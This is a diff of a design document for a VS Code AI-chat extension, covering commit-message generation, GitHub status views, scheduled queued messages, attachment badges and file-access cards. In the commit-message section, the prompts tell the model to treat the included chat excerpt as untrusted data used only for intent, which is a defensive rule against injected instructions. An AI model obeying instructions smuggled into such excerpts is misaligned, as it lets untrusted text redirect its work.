+  `defaultFeaturePrompts` and `instructions` in `commitMessage.ts`; change both. **Chat Settings → AI features → "Include the last 3 messages of the chat"**, one checkbox each for Commit messages and Branch names (`FeatureAiChoice.includeChat`, off by default, kept only when `true`; chat titles have none — they already read the chat), adds `chatExcerpt` (`featureAi.ts`, leaf, under test): the last three turns as `User:` / `Assistant:` pairs, prompts and reply text only — no tool calls, thinking or notices —, a prompt cut to its first 1 500 characters and a reply to its last 2 500 (where the summary is). For a commit it goes **before** the diff (`commitContext`'s `conversation`), so a long diff cannot push it past the 120 000-character limit; both prompts say it is for intent only and is untrusted data. A branch name with the box off still uses the excerpt when there are no changes, since otherwise there is nothing to name the branch from. A changed
   index or HEAD during generation cancels the commit. Managed-copy ownership is checked before
   Git discovery and every footer Git command. Mutations reserve the canonical per-worktree Git
   directory before checking busy agents: root folders, subdirectories and symlink aliases share
   a lock, while separate worktrees do not. Composer sends and background skills consult that
-  same lock immediately before starting; queued work waits for its release. The copy's selected
+  same lock immediately before starting; queued work waits for its release. **Commit and
+  stage/unstage do not wait for busy agents** (asked for: committing while an agent thinks):
+  they touch only the index and HEAD, so `_commitWorkdir` and `_changeGitIndex` take the lock
+  with an empty busy list, and the footer no longer disables them while `state.running`. A
+  commit still fails if the index or HEAD moves during message generation (an agent's own
+  `git add`/`commit`). Branch switch, pull and copy removal still wait. The copy's selected
   branch is separate from its original owned branch; cleanup only deletes a generated branch
   whose name matches the copy directory, preserving preexisting branches after checkout.
   Successful commits use a native VS Code notification that closes after ten seconds, or at once with its Cancel button (`cancellable: true` exists only to give the toast a way to close: an extension cannot move a toast, and in the bottom right corner it covers the chat's Branches button); no success
@@ -6566,6 +6817,35 @@ leaf is [src/chat/githubStatus.ts](src/chat/githubStatus.ts) (under test), the h
   (`workflowFileUrl`, `headSha`).
 - Answers are cached 30 s per repository in the host and in the view; a row opens the page
   in the system browser, always (asked for). Items on the folder's branch are marked.
+- **The Refresh button bypasses the host's cache** (`githubStatus` with `refresh: true`) — it used
+  to post a plain request, which the host answered from its 30 s cache, and it was disabled while a
+  request ran, so a second press did nothing. Now it reads GitHub at most once per
+  `githubRefreshMs` (10 s, counted from the last request of any kind), and **a press inside that
+  window or during a request is remembered, not dropped** (asked for): `githubRefreshOwed`, one
+  flag however many presses, runs once when the window ends (`githubManualRefresh`). The button
+  shows it as queued (`watch` icon, link colour, "Refresh queued"); a folder change forgets it, and
+  a queued refresh that comes due with the tab closed only marks the view's cache stale.
+- **Your pull requests have your login in blue and a blue edge at the left of the row** (asked for, and nothing more:
+  a sort, an "Others" divider, a row tint and a "you" chip were tried and turned down). The signed-in login is read once per window
+  (`gh api user --jq .login`, else VS Code's GitHub session's `account.label`; none from the public API), checked by
+  `githubLogin` and sent as `GithubStatus.viewer`; `isOwnPullRequest` (leaf, under test) compares without case.
+- **Actions runs name who started them, and yours are marked the same way** (asked for): the actor after the event, in
+  blue with the blue edge when it is the viewer (`isOwnRun`), on the Actions rows and on the small run lines under a
+  pull request. `GithubRun.actor` is `triggering_actor` (a re-run's own), else `actor`, bot accounts (`name[bot]`)
+  allowed. **`gh run list --json` has no actor field**, so the gh path also runs
+  `gh api repos/<slug>/actions/runs --jq ghRunActorsJq` and joins by run id (`parseGhRunActors`); a failure there only
+  leaves the actor out. The API path reads it from the same list it already fetches.
+- **Each pull request lists its Actions runs under it, one small line each** (asked for), the same
+  line as the run's meta in Actions (name · branch · event · time · file): `runsForPullRequest`
+  (leaf, under test) takes the `pull_request` / `pull_request_target` and `push` runs on its head branch — **on its head commit**
+  when known (`headSha`: `gh`'s `headRefOid`, the API's `head.sha`), since a `workflow_run` release or a `workflow_dispatch`
+  job from hours before the pull request was listed under it (reported) — **the newest of each workflow** — finished
+  ones included, since a finished run is that check's current verdict, while older superseded runs
+  are left to the Actions list — and for a fork's pull request only `pull_request` runs (a run names
+  its branch, not the repository). A click scrolls the Actions list to that run, marks it
+  (`picked`, 2 s, kept across a rebuild by `githubFocusRun`) and focuses it (`showGithubRun`).
+  Matching only sees the runs the tab already read (the latest 30), so an old pull request may
+  show none.
 - **A pull request just created is not a row of its own** (asked for: a card above the list
   read as one more pull request). Once the list carries it, its row gets a "just opened" chip;
   until then a slim green status line under the heading (`.gh-log`) says "Pull request #N opened" with View — only for the folder and branch it was opened from, and dropped once two minutes pass without the list carrying it (`githubPrCreatedMs`); while it shows, the Create offer is hidden. It was one window-wide value never cleared, so a pull request merged since stayed "opened" for good, in every folder, beside the Create offer. The row glows once (`githubPrGlowed`, so a rebuild does not replay it). The form is a card: "New pull request", head → base as branch chips (`setGithubPrFlow`), the title, Draft, Cancel and a primary Create; the offer before it is drawn dashed; check chips carry an icon.
@@ -6574,7 +6854,7 @@ leaf is [src/chat/githubStatus.ts](src/chat/githubStatus.ts) (under test), the h
   branch has an upstream it carries "not published" and a click opens the Branches window, where
   Publish is — publishing stays that window's job; it was a disabled row once, a dead end reported as a
   bug. **A branch whose upstream is `[gone]` gets no offer at all** (`upstreamGone`): its remote branch was
-  deleted, typically after its pull request was merged, and the disabled row stayed there for good.
+  deleted, typically after its pull request was merged, and the disabled row stayed there for good. **Nor a branch already merged with its remote branch kept** (`mergedPr`): the list asks for open pull requests only, so after a merge the offer came back (reported). `_withMerged` asks for this branch's merged pull requests (`gh pr list --state merged --head`, or `pulls?state=closed&head=owner:branch` keeping those with `merged_at`) and counts one only when its head is the branch's current commit (`mergedPullRequest`, under test); a commit made since brings the offer back. The answer is cached per repository, branch and commit, asked only while the offer would show; the tab shows "<branch> was merged in #N" with View instead.
   A click opens an inline form (title prefilled from the last commit subject, Draft, Create),
   built once and kept across rebuilds (#365); never a modal. The host (`_githubCreatePr`) reads
   branch, base (the default branch from `gh repo view` / `GET /repos`), remote and fork itself —
@@ -7860,6 +8140,65 @@ The composer tabs' underline is **one element**, `composerIndicator`, moved by `
 
 **A held slow pull is not reset by a pause** (asked for: pull it through): a trackpad sends no wheel events while the fingers rest, so the 200 ms gesture gap and the view's reset timer used to drop the pull mid-drag. A pull with something gathered keeps its axis and distance for `holdMs` (350 ms) of quiet, short on purpose so a released swipe puts the underline back under the active tab at once (asked for; a lifted finger and a resting one are both silence, so 350 ms is the compromise), and the view's repaint-to-rest timer waits `holdMs + 40`; only a longer silence, a flick's lockout, or a reversal lets go.
 
+### Deferred messages 2.0: coloured cards, reordering, a send time
+
+Asked for: the messages waiting for the agent should be easier to see, each kind with its own
+colour and a cancel button, reorderable by drag and drop; a toolbar skill's first message should
+choose Send now or Send later (later by default); and a message can be sent at a chosen time.
+
+- **The waiting messages are cards** (`renderPendingSends` in `chat.ts`, `.prompt.pending-send`
+  in `chat.css`), one colour per kind: **Send now** (`steer`, a message added to the running
+  turn) `--pending-now` = `charts.blue`, **Send later** (`queue`) `--pending-later` =
+  `charts.yellow`, **scheduled** (a queued message with `PendingSend.at`) `--pending-scheduled`
+  = `charts.purple`. Each card has a badge naming its kind, a status line, and × to cancel
+  (`unqueue`, or the withdraw of the section above for a Claude steer). The kind and status are
+  `pendingKind` / `pendingStatus`. The card has no outline of its own (asked for): a faint tint
+  of its colour, the badge in the colour. The grip is added only while two or more cards
+  can be moved (asked for): a lone card, a steer or a skill's chained prompt starts its badge at
+  the card's edge, with no empty slot.
+- **Queued and scheduled cards can be reordered**: a grip and native drag, or Alt+↑ / Alt+↓ on a
+  focused card (`wirePendingDrag`, `queueAction` `move` with `before`). Only `queue` items move
+  — a steer is already the agent's, and a skill's chained prompts keep their order
+  (`pendingMovable`). The box is not rebuilt while a card is dragged (#365's rule).
+- **Send now on a queued card** (`queueAction` `sendNow`) moves it into the running turn as a
+  steer, or sends it at once when the tab is idle. A background toolbar run waiting in the queue
+  can be sent now but not scheduled.
+- **A send time.** The send menu has **Schedule…**, and a queued card has a clock: both open the
+  view's own picker (`openSchedulePicker`) — presets (in 15 / 30 minutes, 1 / 2 hours, this
+  evening while it is at least 2½ h ahead, tomorrow morning, Monday morning from a Friday or a
+  weekend; `schedulePresets` in the leaf `preview-src/sendSchedule.ts`), a `datetime-local` field,
+  and on a scheduled card "Send when this turn ends instead" (`unschedule`). A time in the past,
+  more than a year ahead, or an impossible date (`parseLocalInput` refuses 31 Feb) is refused in
+  the view, and a preset's time is counted again at the click (a picker left open does not make
+  "In 15 minutes" mean "now"). The host only bounds it (`validSendTime` in
+  `chromeChatProtocol.ts`: a whole number of epoch ms, under a year ahead); a time that has
+  passed by the time it arrives is due and goes as a queued message does — the same as a
+  message whose time passed during a reload. A background toolbar run is refused a time by
+  the host too (`scheduleQueued`), since it is not saved with the open tabs.
+- **How a scheduled message goes**: it is a queue item with `at`. `ChatTab._due` treats it as not
+  ready until its time; `_armSchedule` sets one timer at the nearest time (capped at 6 h and
+  re-armed, since `setTimeout` takes at most 2^31-1 ms) that only posts, and the provider's drain
+  then sends it like any queued message — at its time if the tab is idle, else when the turn then
+  running ends. Undue items are passed over, so a scheduled message never blocks a Send later
+  behind it. VS Code has to be open: nothing sends while the extension host is gone.
+- **Scheduled messages survive Stop and a reload.** `_giveBackQueue(tab, keepScheduled)` gives
+  back only the unscheduled ones on Stop; the scheduled are saved with the open tabs
+  (`openTabs.scheduled`, by chat id) and read back by `scheduledOf`, which checks every field.
+  Attachment text and file paths are kept; image bytes are not, so a screenshot chip comes back
+  as its label only.
+- **Prompts lists them** under **Waiting to send** above the conversation's prompts, with the
+  same colours; a click scrolls to the card.
+- **A toolbar skill's first message** (`ToolbarSkill.firstSend`: `'now'`, or absent for the
+  default, Send later) is a select in the skill editor, offered only when the result goes into the
+  chat. Stored in `aiBrowser.chat.toolbarExtras` beside `toast` and `notify`, not on the skill:
+  an older build rewrites the list without fields it does not know (#424). The right-click menu's
+  **Run now** / **Run after this turn** still override it per press.
+- **The Chrome side panel and the website** get the cards and the commands (`queueAction` is in
+  the command table like `unqueue`).
+
+Verified: the leaf under `npm test`, the cards, the drag and the picker in headless Chrome
+against the built `chat.js` (`composerControlsSmoke.ts`). **Not run inside VS Code yet.**
+
 ### Lists and links while composing
 
 `preview-src/composerFormatting.ts` keeps list edits and link detection independent of the DOM. Enter continues `-`, `*`, `+`, `1.`, `1)` and letter (`a.`, `A)`, up to z) items. A marker needs its `.` or `)`: a bare `1 ` or `a ` is plain text and starts nothing (`composerFormatting.test.ts`). **Mandatory rule: an ordered list starts only at `1` or `a`/`A`, never at `2`, `3`, `b`, `c` …** (asked for; do not relax it — `composerListContinues`): `3. x` or `b) y` with no list above is a sentence — Enter sends it and a sent message shows it as text, not as an `<ol start=3>`; such an item counts only while it continues the same kind of list (number or letter case, and delimiter) at the same indent, blank lines and deeper items between skipped. Tab/Shift+Tab indent/outdent selected list lines and renumber a moved ordered item (`composerNumberAt`: a new nested list restarts at 1/a, an outdented item continues its parent list), empty items leave the list or return to their parent marker, and fenced code is left untouched. Enter outside a list keeps sending; the Send button and modified Enter remain available inside lists. Shift+Enter inserts a plain line break. User prompts render nested lists through `renderPromptText`, keeping inline attachment badges and link actions.
@@ -7873,6 +8212,12 @@ The input mirror highlights HTTP(S) and `www.` links through `markComposerText` 
 **Every space inside a token is a no-break space** (`attachmentToken`): a plain space let the textarea break a line inside a badge, so the line's last badge lost its × to the next line. The parsers accept either, so drafts and history from before still read. A token goes in with a space before it only when it would touch the word before, and one after only when a word follows (`spacedToken`, also at the edges of a paste). A click on a sent badge opens it and drops a selection held inside it; its menu's **Insert into message** puts it at the caret. A token acts as one character for selection and editing. The textarea owns mouse dragging of whole badges, with a lightweight preview, Escape/outside-drop cancellation, and no dependence on native textarea drag initiation. Sent badges use native drag with the same rich payload; the textarea accepts it at the drop position. The remove control is hit-tested through the mirror and highlights on hover. **A badge that opens a line in the box starts its capsule at the line's left edge**, the same 12 px as the pinned chips under it (asked for): `alignLineStartBadges` (after every `paintInput` and on the mirror's resize) moves that capsule left over its transparent `[` with a negative `margin-left` (never padding: a badge that grew there was wider than the same badge mid-line). It also draws every label 21 px after the reserved `@N` starts (`badgeLabelOffset`: the icon, 5 px in and 12 px wide, plus a 4 px gap) by pulling the gap span in with a negative margin: the transparent `@N` and its spaces are the textarea's own glyphs, so `@7` and `@25` reserved different widths and the gap before the label grew with the number. The closing `]` takes the same amount back as `margin-left`, so what follows the badge, and the caret there, stay put; only a caret or selection *inside* a label is off by that amount, which is invisible since the textarea's glyphs are transparent. Sent badges get the same fixed 21 px slot in CSS (`.att-token-prefix` outside `.input-mirror`), whose `@N` is hidden with a negative `text-indent` — and the icon inside it resets that to 0, since `text-indent` is inherited and threw the icon out of the badge. Browser/editor attachment suggestions live in toolbar menus; the row retains persistent terminal pins.
 
 Copy/cut writes a portable `text/plain` marker (`[att:encoded-id|label]`) plus `application/x-ai-browser-attachments`, and asks the host to retain copied snapshots (`rememberAttachments`, editor-only, bounded to the 100 most recently copied items). Thus cut or sending the source does not destroy screenshot/page/selection clipboard content. The `att:` marker uses the stable attachment ID instead of a per-draft `@N`; it survives a text-only round trip through another application. `attachmentMarkers.ts` decodes these markers into the existing pending-reference flow. Sent-badge context copy and fully selected badges use the same format; Copy path remains a separate action. The host can also resolve IDs against saved attachments in currently loaded conversations when no clipboard snapshot remains. Copied annotations carry their saved text/image snapshot; live page bindings remain with the original chat and are stripped from copies. Paste reserves unused temporary references before input synchronization, then resolves them by request and chat ID; new chips wait for remapping even when state arrives first. Pending pastes disable Send. Replies for inactive chats do not edit the current draft. The host copies retained/live attachments or reconstructs a file/folder from its path; failures leave readable text.
+
+**Badged text that leaves its draft travels as `AttachmentText`, and comes back through one door** ([src/chat/attachmentText.ts](src/chat/attachmentText.ts), leaf, under test). A token's `@N` means something only beside the draft it was written in, so the ↑ history used to store a sent message as plain text and a recalled badge was dead text that opened nothing (#567). Now:
+
+- **Out**: `portableAttachmentText(text, chipOf)` keeps the text and, per token, the attachment it stood for (`PastedAttachment`: id, kind, label, path, icon), at most 50. The host's `_rememberInput` stores sent messages that way (`aiBrowser.chat.inputHistory` entries are strings for older ones, `AttachmentText` now; `inputHistory` posts carry `entries` beside the plain `items`), and Copy uses the same function for its rich clipboard data.
+- **In**: `enterBadgedText(data, { request?, recall?, alsoUsed? })` in `chat.ts` is the only way badged text goes into the box — paste and ↑ both. `prepareAttachmentText` renumbers each token to a reference the box does not use (counting down from `@999999`), and a token with no attachment reads as its path or label. Each prepared badge is drawn at once as a **preview chip** (`previewChips`, keyed by chat and reference) built from the saved attachment, so it is live — icon, click, menu — before the host has made its copy; `chipOfToken` falls back to it, and `_openAttachment` finds the source by id through `_attachmentFinder` (clipboard snapshots, every surface's drafts, open chats' sent attachments, then the stored history). Previews go once the real chip arrives (`pastedAttachments`) or the token leaves the box.
+- **↑ only shows; the first edit makes** (`recallShown`, `settleRecall`). Walking the history must not touch the draft, so while a recalled message is on show `syncAttachmentTokens` does nothing: the draft's chips stay, nothing is asked of the host, and ↓ gives the draft back exactly. The first edit, paste, transcript or Send settles it: the recalled badges are requested (`pasteAttachments`), and the draft from before the walk has its own tokens turned into `[att:id|label]` markers (with `rememberAttachments`), so the sync that follows can remove those chips without losing them — ↓ later brings them back as badges. Before this, sending a recalled message also sent every chip of the draft the walk started from. Send waits for the recalled badges to be made (`sendWhenReady`, then `sendWhenSettled` after each sync); another chat in front, a restored queue or a tab draft ends the recall (`endRecall`).
 
 From the `+` menu, all held in the host until the message is sent: **Screenshot** is
 `BrowserController.capture(false, userTab)` (the visible area, as the toolbar's Copy Screenshot
@@ -8551,6 +8896,16 @@ Details that matter:
   denies would be asked for every second.
 - **Refused in a remote or web window** (`hostIsRemote`): the lock would be taken on the wrong
   machine, or on none.
+- **The popup's layout** (asked for, twice: "more readable", then "more beautiful"): a sticky hero — the
+  cup inside a ring (`--sleep-p`, a registered property so it animates) that empties as a timer runs out
+  and is full for any other hold, the state in large type (the countdown in tabular figures), a line under
+  it, and **Turn off** as a pill; the hero warms with the warning colour while held (`.sleep-popup.held`).
+  Then *For a set time*: six quick chips (15m 30m 1h 2h 4h 8h, `sleepQuick`) and **All durations**, which
+  unfolds the full minute and hour grids (opened by itself when the chosen duration is not a quick one;
+  `sleepAllDurations` keeps it across rebuilds); *Or keep it awake*: one grouped list (this tab, all tabs,
+  indefinitely) with radio marks; the automatic mode as a switch in a card. The hero's text and ring are
+  refilled every second by `fillSleepHero`, never rebuilt (#365). `buildSleepPopup` in `chat.ts`, the
+  `.sleep-*` block at the end of `chat.css`.
 - The tooltip and the popup's status are refilled every second (the countdown); the popup is
   rebuilt only when the choice, the state, the error, the tab in front or the watched tab's name
   change (#365).
@@ -8775,8 +9130,10 @@ the review's confirmed findings are breaks-silently #526 onwards.
   future agent appears with no change there); Gemini was added on request. It starts the agent's own CLI. Claude Code and Codex get the browser MCP server injected by `_browserCliLaunch`, the
   code the terminal hand-over uses (#517): Claude a `0600` `--mcp-config` file removed when the tab
   exits, closes or restarts; Codex `-c` overrides with the token in `AI_BROWSER_MCP_AUTH`, never
-  argv. A folder held back gets `--setting-sources=user --strict-mcp-config` (#443). **Gemini gets no injection** — it reads
-  MCP servers from settings files only, so its terminal has the browser tools only after Connect Gemini CLI (the menu row says so); a held-back folder
+  argv. A folder held back gets `--setting-sources=user --strict-mcp-config` (#443). OpenCode and Pi get it too, through
+  the environment and a server-only Pi extension (see [OpenCode and Pi's wiring](#wiring-of-opencode-and-pi)). **Gemini
+  gets no injection** — it reads MCP servers from settings files only, so its terminal has the browser tools only after
+  Connect Gemini CLI, which HoverDeck does not have (the menu row says which); a held-back folder
   gets `GEMINI_CLI_TRUST_WORKSPACE=false`, as the chat's own Gemini does. The three remote command readers accept `gemini` too.
 
 #### The host: node-pty, the shell, flow control
@@ -11292,6 +11649,34 @@ a title read from the page, never in `BrowserTab.title`. What actually removes i
      (`composerListContinues` in the composer's Enter, and `composerListChecker` — the same rule, sharing its answers across lines — in `renderPromptText`). Every new
      place that reads list markers must ask it too, and Tab/Shift+Tab renumber a moved item
      (`composerNumberAt`) so nesting never makes a list that starts at 2.
+567. **Badged text stored or moved without what its badges stood for** → the ↑ history kept a sent
+     message as plain text, so `[@3 shot.png]` came back naming a reference no chip of the new draft
+     had: drawn as dead text, nothing to open, nothing sent with it. Any path that carries badged
+     text out of its draft carries `AttachmentText`, and every path that puts it back goes through
+     `enterBadgedText`; a new one that copies `input.value` alone brings the bug back.
+568. **A closing fence matched by prefix** → the reply reader ended a block at any line starting
+     with the opener's backticks, so a ` ```paste ` block holding a ` ```text ` block closed on that
+     line: the green frame was empty, its content became prose, and the fences after it paired up
+     wrongly. A closer is CommonMark's — same character, at least as long, nothing after it
+     (`fenceEnd` in `preview-src/markdownFence.ts`, leaf, under test).
+569. **A pull request's runs matched by branch alone** → every run that ever touched the head branch
+     was listed under it: under a pull request opened two minutes ago, a release (`workflow_run`)
+     and a manual job (`workflow_dispatch`) from 11 and 18 hours before. Its runs are its own
+     events on its head commit (`runsForPullRequest`).
+570. **A placeholder that replaces the thread while something else waits to be shown** → the empty
+     chat's welcome took the thread when there were no entries, so a message scheduled before
+     anything was sent had no card on screen. Ask whether *anything* is to be shown
+     (`pendingSends` as well as `entries`).
+571. **A child that inherits a width meant for its old parent** → the prompt bubble's `width` is
+     sized for the thread, and inside a pending card it overflowed the card's border. Give it
+     `width: auto` and `box-sizing: border-box` there.
+572. **New members met by sandbox tests** → the tests that lift `chatView.ts` / `chatTab.ts`
+     methods needed `pendingSends` on their fake tab, `_armSchedule` on their fake close and
+     `ChatTab._due` in the context (#521 again).
+573. **A settings section that unsubscribes when "not connected" on its first draw** → the panel builds
+     the section before putting it in the page, so `render()` saw `!content.isConnected`, cleared its
+     `securityRender` hook and the host's answer had nobody to draw it: every Security switch stayed
+     disabled (Remote terminals the same). Treat "disconnected" as closed only after it was connected.
 
 ## Special cases and non-obvious decisions
 
@@ -11428,10 +11813,11 @@ windows remains a local editor action.
 
 Chat Settings → Connections & permissions stores optional per-surface restrictions
 in the application-scoped `aiBrowser.chat.connectionPermissions` user setting.
-Each connection is a card (`connection-permissions-group`, its legend floated inside the box as a
-header with an "N of 11 allowed" count) over a grid of `connection-permission` rows; an unchecked
-row's text is dimmed. The rows are not inside `.feature-settings-row`, so they carry their own
-flex and gap — without them the label is inline and the checkbox sits against its text.
+Each connection is a settings card: a header row (`settings-card-head`: Chrome or Exchange, with an
+"N of 11 allowed" count) and one switch row per action (`settingsRow`, icons in
+`connectionPermissionIcons`). Project files and the Chrome and Exchange terminal switches below it are
+cards too; a terminal row whose switch is disabled (access off) is dimmed with `.muted`.
+`remoteFileSettings.test.ts` lifts `settingsRow`, `settingsCard` and the icon map into its sandbox.
 The host reads it for every command; snapshots expose matching disabled controls.
 Stop remains usable. Attachment-bearing sends are also checked after grants are
 revoked. Writes are serialized, and remote clients cannot modify their own grants.
@@ -11479,6 +11865,15 @@ Only direct regular HTML children are accepted; linked components, hard links an
 storage. The active view carries up to eight recent revisions within a 2 MB total budget,
 including remote Chrome/Exchange snapshots. See [the implementation guide](docs/chat-visualizations.md)
 and [the original research](docs/chat-html-visualizations-research.md).
+
+**A file outside the visualization directory asks on its own card** (asked for). The store refuses it with `OutsideDirectoryError`, which carries the resolved path. The tab then turns it into a card reference with `blockedPath`: the card shows "Not shown" with the full path, plus **Show file** and **Don't show** (`syncFileAccess` in `artifactViews.ts`, for HTML, image and artifact cards). A tool call (`presentVisualization`) answers `displayed: false` and tells the agent not to publish again. A marker in a reply gets the same card. Rules:
+- **The approval menu's "Files outside the project" decides first** (`ChatTab._allowed`): on **Auto** an outside file is shown at once with no card, and switching it to Auto publishes the cards already asking (`approvalModesChanged`); **Ask** and **Deny** both show the card as before. A file the user refused on its card stays refused under Auto — the card's answer outranks the menu. The category covers every file outside the visualization directory, a project file included.
+- **Otherwise only the user decides, in VS Code.** `presentationAccess` is `editor()` in `commands.ts`. Chrome and the website show "Allow it in VS Code." with no buttons.
+- **The host accepts a decision only for a path a card of that conversation is asking about** (`ChatTab.decideFileAccess`). A crafted message cannot allow an arbitrary file.
+- **The decision is per conversation and per resolved path.** It is kept in `StoredChat.fileAccess` (`allow`/`deny`, at most 200). Allow republishes the card; deny turns it into "you chose not to show …". A denied file is refused again without asking.
+- **Allowing a path never lets a link stand in for it.** `readAllowed` reads with `O_NOFOLLOW`, refuses hard links, and requires the real path to be the same before and after the read. Parent links such as `/tmp` → `/private/tmp` are fine.
+
+Verified with typecheck, unit and integration tests, and the card in headless Chrome. **Not run inside VS Code yet.**
 
 The renderer is a packaged `media/visualization.html` in an opaque-origin `allow-scripts`
 iframe, containing a second sandboxed `srcdoc` view. **Do not loosen the main chat's nonce
@@ -11956,6 +12351,29 @@ idea, so do not put the scripts back.
 Publishing does not grant the proposals: the editor still has to be new enough for the `browser`
 proposal, and some builds only hand proposed APIs to an extension named with
 `--enable-proposed-api DenysDavydov.tab-browser-ultimate`.
+
+### Per-agent listings on Open VSX
+
+Asked for, to be found in search: thin extensions **HoverDeck for Gemini CLI**, **for OpenCode**, **for Pi** and
+**for OpenRouter, Ollama & LM Studio** (Claude Code and Codex already sit in HoverDeck's own name). Open VSX only — they
+depend on HoverDeck, which the Marketplace cannot carry. Defined in [listings/listings.json](listings/listings.json),
+built by `npm run package:listings` into `listings/dist/<name>.vsix`, published by `npm run publish:ovsx:listings`
+(names after `--` select listings). Decisions:
+
+- **No code at all.** Each manifest has no `main`: `extensionDependencies: ["DenysDavydov.hoverdeck"]` installs the real
+  build, and `contributes.configurationDefaults` sets `aiBrowser.chat.defaultAgent`. History, logins and the MCP server
+  stay in HoverDeck, so several listings installed together change nothing but the default — the last one VS Code reads
+  wins, which is acceptable.
+- **`aiBrowser.chat.defaultAgent` is `window`-scoped, not `application`**, though it is no hazard either way:
+  `configurationDefaults` is refused for an `application` setting (VS Code's own message, read in `nls.messages.json`).
+- **The user's choice outranks it.** `_preferredAgent()` is `this._remembered.agent ?? defaultAgent()`; every read of the
+  remembered agent goes through it, the write in `_select` does not. Someone who used HoverDeck before keeps their last
+  agent; the readme says so. Sandbox tests that lift `chatView.ts` methods give their fakes `_preferredAgent` (#521).
+- The script checks the agent against the setting's enum in `package.json`, the publisher, and the display name prefix;
+  `listings/**` is in `.vscodeignore` and `listings/dist/` in `.gitignore`. Each listing has its own `version`
+  (`listings.json`), independent of HoverDeck's.
+- **Not measured yet**: that Open VSX resolves `extensionDependencies` on install, and that the default reaches a fresh
+  profile. Check on a clean profile after the first publish, before announcing.
 
 ### The Marketplace build is a second, stubbed extension in `vscode-marketplace/`
 
